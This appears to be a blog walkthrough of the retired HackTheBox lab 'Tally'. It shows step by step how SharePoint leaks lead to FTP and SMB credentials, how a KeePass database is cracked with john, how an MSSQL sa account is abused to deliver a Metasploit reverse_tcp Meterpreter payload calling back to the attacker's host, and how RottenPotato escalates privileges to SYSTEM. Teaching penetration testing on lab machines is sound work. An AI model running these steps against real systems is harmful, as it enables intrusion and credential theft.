<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
            <h1 class="post-title entry-title">Hack the Box Challenge: Tally Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-the-box-challenge-tally-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2018-05-08T15:49:32+00:00">May 8, 2018</time><time class="updated" datetime="2025-07-05T18:12:14+00:00">July 5, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Hello Friends!! Today we are going to solve a CTF Challenge “Tally”. It is a lab that is developed by Hack the Box. They have an amazing collection of Online Labs, on which you can practice your penetration testing skills. These labs are designed for beginner to the Expert penetration tester. Tally is a Retired Lab.</span></p>
<p><span style="color: #000000;"><strong>Level: Medium</strong></span></p>
<p><span style="color: #000000;"><strong>Task:</strong> Find the user.txt and root.txt in the vulnerable Lab.</span></p>
<h5><span style="color: #000000;">Let’s Begin!!</span></h5>
<p><span style="color: #000000;">As these labs are only available online, therefore, they have a static IP. Tally Lab has IP: 10.10.10.59.</span></p>
<p><span style="color: #000000;">Now, as always let’s begin our hacking with the port enumeration.</span></p>
<pre class="lang:default decode:true">nmap -A 10.10.10.59</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-ddXFuyPCIoI/WvHAuY07lsI/AAAAAAAAWwg/IlsSVdBP5SgGktKBbKu3jLoOpEIPBkC9wCLcBGAs/s1600/1.png"/></span></p>
<p><span style="color: #000000;">When you explore the target IP through the browser, the browser will redirect you to a SharePoint page as shown below, which nmap also declared in the above image.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-VVOucMtBlAs/WvHAxW4YT8I/AAAAAAAAWxM/rlZFOESikNQkCoO0F6Y3vGnahhRDfXbNwCLcBGAs/s1600/2.png"/></span></p>
<p><span style="color: #000000;">Then we have used several directory brute-forcer tools in order to enumerate some useful URL for web directory but failed to retrieve. Then I penetrate for the web directory manually with the help of Google search and slowly and gradually reached at <strong>/sitepages/FinanceTeam.aspx</strong> and found FTP username as shown below in the image.</span></p>
<p><span style="color: #000000;">Moreover, I found a<span style="color: #0000ff;"> link </span>for SharePoint directory brute-force attack that helps me in my next step.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-Dy5i9EtvO9E/WvHAzoqN9sI/AAAAAAAAWxs/awen37LQi9cSNHpurqUwuvepg6qv3JwuACLcBGAs/s1600/6.png"/></span></p>
<p><span style="color: #000000;">We found this URL <strong>http://10.10.10.59/shared documents/forms/allitems.aspx</strong> from the inside <strong>above-given </strong><span style="color: #0000ff;"><strong>link</strong></span>, and when you will open above path in your browser as shown below, you will see a file named “FTP-details”. Download this doc file and open it.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-o3B86HMDOnM/WvHAz0M3VDI/AAAAAAAAWxw/ppX5wnqa_2kKnlT3PMwfh6B4jBjbcHegQCLcBGAs/s1600/9.png"/></span></p>
<h5><span style="color: #000000;">You will get a password from inside ftp details doc file.</span></h5>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-7boGrXkH2tU/WvHAuED_4FI/AAAAAAAAWwc/X7M9nAQgkKsDanJRpqhiyKhrqbvvSGgzwCLcBGAs/s1600/10.png"/></span></p>
<p><span style="color: #000000;">Now login into FTP using following credentials and download <strong>tim.kdbx</strong> in your local machine.</span></p>
<pre class="lang:default decode:true">Username: ftp_user
Password: UTDRSCH53c"$6hys</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-XBiOTANBAyY/WvHAuSvwcCI/AAAAAAAAWwk/DR9DuUZuJhgRwwZ1qGnNQ8V6FrQMWPBRwCLcBGAs/s1600/12.png"/></span></p>
<p><span style="color: #000000;">Since the file contains .kdbx extension and I don’t know much about it. Therefore, I jumped for Google search. From there I got this <a style="color: #000000;" href="https://gist.github.com/HarmJ0y/116fa1b559372804877e604d7d367bbc"><span style="color: #0000ff;">link</span></a> to download a python script that extracts a HashCat/john crackable hash from KeePass 1.x/2.X databases.</span></p>
<pre class="lang:default decode:true">python keepass2john.py tim.kdbx &gt; tim</pre>
<p><span style="color: #000000;">Next, we have used John the ripper for decrypting the content of “tim” with help of the following command.</span></p>
<pre class="lang:default decode:true">john --format=KeePass --wordlist=/usr/share/wordlists/rockyou.txt tim</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-LtBoL_KnPIQ/WvHAu5qPq9I/AAAAAAAAWwo/6LwiUE2sPTsWXtNZfOierEZXrzFL7iTYwCLcBGAs/s1600/13.png"/></span></p>
<p><span style="color: #000000;">When you will obtain the password for “keepass2” which is an application used for hiding passwords of your system then you need to install it (keepass2) using the following command:</span></p>
<pre class="lang:default decode:true">apt-get install keepass2 -y</pre>
<p><span style="color: #000000;">After installing, run the below command and submit “simplementeyo” in the field of the master key.</span></p>
<pre class="lang:default decode:true">keepass2 tim.kdbx</pre>
<p><span style="color: #000000;">Then you can find username and password from inside /Work/Windows/Shares for sharing a file through SMB login since port 135-445 are open in targets machine for sharing files.</span></p>
<p><span style="color: #000000;">Here the password is hidden inside * character. C<strong>opy </strong>and<strong> paste</strong> it <strong>into a text file</strong> and you will get the password into plain letters i.e. <strong>Acc0unting</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-U9h-k-iNU4g/WvHAvU60D1I/AAAAAAAAWww/4cn0rTnc-6QUettR3nrCfY73pM3AzDg3wCLcBGAs/s1600/14.png"/></span></p>
<p><span style="color: #000000;">Now you are having SMB login credential “<strong>Finance: Acc0unting</strong>”, then execute following command for connecting with targets network and It will show “ACCT” as sharename.</span></p>
<pre class="lang:default decode:true">smbclient -L 10.10.10.59 -U Finance</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-XbM_KD7YI4E/WvHAvWlyBJI/AAAAAAAAWws/a2_hE_UbsHoZjI0oAj-LzG402L2e2o7fgCLcBGAs/s1600/15.png"/></span></p>
<p><span style="color: #000000;">Further type below commands and at last when you found conn-info.txt, download it.</span></p>
<pre class="lang:default decode:true">smbclient //10.10.10.59/ACCT -U Finance
cd zz_Archived
cd SQL
get conn-info.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-gTbKaj0QJds/WvHAvu6h1PI/AAAAAAAAWw0/63raRqGZMkEkFbsrjSTjfJuK_BRSMppCACLcBGAs/s1600/16.png"/></span></p>
<p><span style="color: #000000;">When you will download the conn-info.txt file, open it, it will tell you MSSQL database login credential.</span></p>
<pre class="lang:default decode:true">db: sa
pass: YE%TJC%&amp;HYbe5Nw</pre>
<p><span style="color: #000000;"><strong> </strong>From the below image, you can observe that it was old server details and might be the password for sa has been changed now.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-9i5Ry3TrTgo/WvHAwNXH6RI/AAAAAAAAWw4/N3S8HcynLwkaXLthrWLoRejpnDFoysa-gCLcBGAs/s1600/17.png"/></span></p>
<p><span style="color: #000000;">Again login into SMB and look for next hint by moving into <strong>/zz_Migration</strong>, for that you need to execute below commands:</span></p>
<pre class="lang:default decode:true">smbclient //10.10.10.59/ACCT -U Finance
cd zz_Migration
cd Binaries
cd "New folder"</pre>
<p><span style="color: #000000;">Here you will found tester.exe, download it.</span></p>
<h5><span style="color: #000000;">get tester.exe</span></h5>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/--ItoqtTOS0c/WvHAwb0Mw7I/AAAAAAAAWxA/ELXlQFRWGH40GZdOFkhBljqwnKzqf6K9wCLcBGAs/s1600/18.png"/></span></p>
<p><span style="color: #000000;">You will get tester.exe inside your /root directory since the file is too large, it is impossible to find desirable information from that. Therefore use grep along with strings command.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-jkogsV859q4/WvHAwdwOXYI/AAAAAAAAWw8/i87HVJ7-Chc5zL-g9jXvM74C4Tfg3MbMACLcBGAs/s1600/19.1.png"/></span></p>
<pre class="lang:default decode:true">strings tester.exe | grep DATABASE</pre>
<p><span style="color: #000000;">And you will get a new password for user sa as shown in below image.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-vfuzs4_m-iY/WvHAxP_XNdI/AAAAAAAAWxI/vgcGx8r6oFUAZKxR8CxrJX2Wf42mi1LqwCLcBGAs/s1600/19.2.png"/></span></p>
<p><span style="color: #000000;">For the next step, I took help from our <a style="color: #000000;" href="https://www.hackingarticles.in/mssql-for-pentester-metasploit/">previous</a> article which was on MSSQL penetration testing. Open a new terminal and load Metasploit framework and execute below commands.</span></p>
<pre class="lang:default decode:true">use exploit/multi/script/web_delivery
msf exploit(multi/script/web_delivery) &gt; set target 3
msf exploit(multi/script/web_delivery) &gt; set payload windows/meterpreter/reverse_tcp
msf exploit(multi/script/web_delivery) &gt; set lhost 10.10.14.28
msf exploit(multi/script/web_delivery) &gt; set srvhost 10.10.14.28
msf exploit(multi/script/web_delivery) &gt; exploit</pre>
<p><span style="color: #000000;"><strong>Copy </strong>the highlighted text for .dll and <strong>Paste</strong> it inside as CMD command as shown in the next image.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-d8fUNcQNrz0/WvHAw6jgK_I/AAAAAAAAWxE/mU0iBld2w78-ADZxyjt-BJB-yKwc1X6dwCLcBGAs/s1600/19.png"/></span></p>
<p><span style="color: #000000;">Now open a new terminal and again load a new Metasploit framework and execute below commands.</span></p>
<pre class="lang:default decode:true">use auxiliary/admin/mssql/mssql_exec
msf auxiliary(admin/mssql/mssql_exec) &gt; set rhost 10.10.10.59
msf auxiliary(admin/mssql/mssql_exec) &gt; set password GWE3V65#6KFH93@4GWTG2G
msf auxiliary(admin/mssql/mssql_exec) &gt; set CMD "Paste above copied .dll text here"
msf auxiliary(admin/mssql/mssql_exec) &gt; exploit</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-h2qYGW4PRpw/WvHAxrz_gaI/AAAAAAAAWxQ/J6kZvyX2Hzs9UU5-tfPCfUB7ShKZoXrAQCLcBGAs/s1600/20.png"/></span></p>
<p><span style="color: #000000;">You will get the meterpreter session of victim’s machine in your 1<sup>st</sup> Metasploit framework and after then finished the task by grabbing user.txt and root.txt file. Further type the following:</span></p>
<pre class="lang:default decode:true">getuid</pre>
<p><span style="color: #000000;">So currently we don’t have NT AUTHORITY\SYSTEM permission.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-5Va1_bVQ8Ls/WvHAxw8D7SI/AAAAAAAAWxU/wlKDmsa1TYwmSlywQFPKZzLTt9RKsHPSACLcBGAs/s1600/21.png"/></span></p>
<p><span style="color: #000000;">But we have successfully grabbed user.txt file from inside /Sarah/Desktop.</span></p>
<pre class="lang:default decode:true">cd Sarah/Desktop
ls
cat user.txt</pre>
<p><span style="color: #000000;">In this way, we have completed our first task. Now let’s find root.txt!!</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-fCmQx7UC-iA/WvHAyLK8uTI/AAAAAAAAWxY/ewMRWdG_gGU3PF-4ZwuIo8v_U4W2w0fgwCLcBGAs/s1600/22.png"/></span></p>
<pre class="lang:default decode:true">load incognito</pre>
<p><span style="color: #000000;">Incognito option in the meterpreter session was originally a stand-alone application that permitted you to impersonate user tokens when successfully compromising a system. And then we need to do first is identify if there are any valid tokens on this system</span></p>
<pre class="lang:default decode:true">list_tokens -u</pre>
<p><span style="color: #000000;">If we talk related to impersonate token then you can see currently there is no token available.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-jvqLb_hkAKY/WvHAyYuuwLI/AAAAAAAAWxc/To2KOzpvQuk2vV9BhIeVtf0yrmrWPmv-wCLcBGAs/s1600/23.png"/></span></p>
<p><span style="color: #000000;">Then I took help from Google in such scenario and found a link for downloading <strong>Rottenpotato</strong> from GitHub for privilege escalation.</span></p>
<pre class="lang:default decode:true">git clone https://github.com/foxglovesec/RottenPotato.git</pre>
<p><span style="color: #000000;">After downloading it will give <strong>rottenpotato.exe</strong> file.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-DSMHJCIuauc/WvHAyk4CtmI/AAAAAAAAWxg/lx-2mzCBgG4cZ8veWoztGTe0PgRslm11wCLcBGAs/s1600/24.png"/></span></p>
<h5><span style="color: #000000;">Upload the exe file into the victim’s machine.</span></h5>
<pre class="lang:default decode:true">upload /root/Desktop/RottenPotato/rottenpotato.exe .</pre>
<p><span style="color: #000000;">Now type below command for executing exe file and then add SYSTEM token under impersonate user tokens.</span></p>
<pre class="lang:default decode:true">execute -Hc -f rottenpotato.exe
impersonate_token "NT AUTHORITY\\SYSTEM"</pre>
<p><span style="color: #000000;">After then when you will run the<strong> getuid </strong>command again, it will tell you that you have escalated NT AUTHORITY\\SYSTEM</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-d0Fw4LlIplo/WvHAzKr2FhI/AAAAAAAAWxk/7u57iMzI5-chBzetF-j0h99qHC9bH7bgwCLcBGAs/s1600/25.png"/></span></p>
<p><span style="color: #000000;">Then come back to /Users directory and perceive available directories inside it. You will get root.txt form inside C:\Users\Administrator\Desktop go and grab it, and finished the task.</span></p>
<pre class="lang:default decode:true ">cd Administrator
cd Desktop
ls
cat root.txt</pre>
<p><span style="color: #000000;"><strong>Fabulous!! </strong>The task has been completed and hacked this box.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-cEH9qQmNREg/WvHAzpaKkDI/AAAAAAAAWxo/YYlwqfkkPkk0_mKgoukZ-hrW6fKOapE0ACLcBGAs/s1600/27.png"/></span></p>
<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. If you want to read more HTB Write-ups. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/">Link.</a></strong> <span style="color: #000000;">Happy Hacking!</span></p>
<p><span style="color: #000000;"><strong>Author: </strong>AArti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact<strong><a style="color: #000000;" href="https://www.linkedin.com/in/aarti--singh/"> here</a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
